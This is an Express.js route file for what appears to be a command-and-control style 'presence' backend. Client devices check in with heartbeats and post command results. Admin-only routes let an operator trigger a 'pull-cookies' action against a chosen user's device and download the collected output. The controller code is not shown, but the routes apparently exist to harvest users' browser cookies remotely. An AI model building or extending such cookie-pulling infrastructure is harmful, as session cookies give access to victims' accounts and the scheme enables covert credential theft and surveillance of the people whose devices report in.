const express = require('express');
const { authenticateToken, requireAdmin } = require('../middleware/auth');
const {
  heartbeat,
  submitCommandResult,
  requestCookiePull,
  getCommand,
  downloadCommandResult,
  reportDead,
  getLiveStatus
} = require('../controllers/presenceController');

const router = express.Router();

// Device (any authenticated user)
router.post('/heartbeat', authenticateToken, heartbeat);
router.post('/report-dead', authenticateToken, reportDead);
router.post('/commands/:id/result', authenticateToken, submitCommandResult);

// Admin
router.get('/admin/live', authenticateToken, requireAdmin, getLiveStatus);
router.post('/admin/users/:userId/pull-cookies', authenticateToken, requireAdmin, requestCookiePull);
router.get('/admin/commands/:id', authenticateToken, requireAdmin, getCommand);
router.get('/admin/commands/:id/download', authenticateToken, requireAdmin, downloadCommandResult);

module.exports = router;
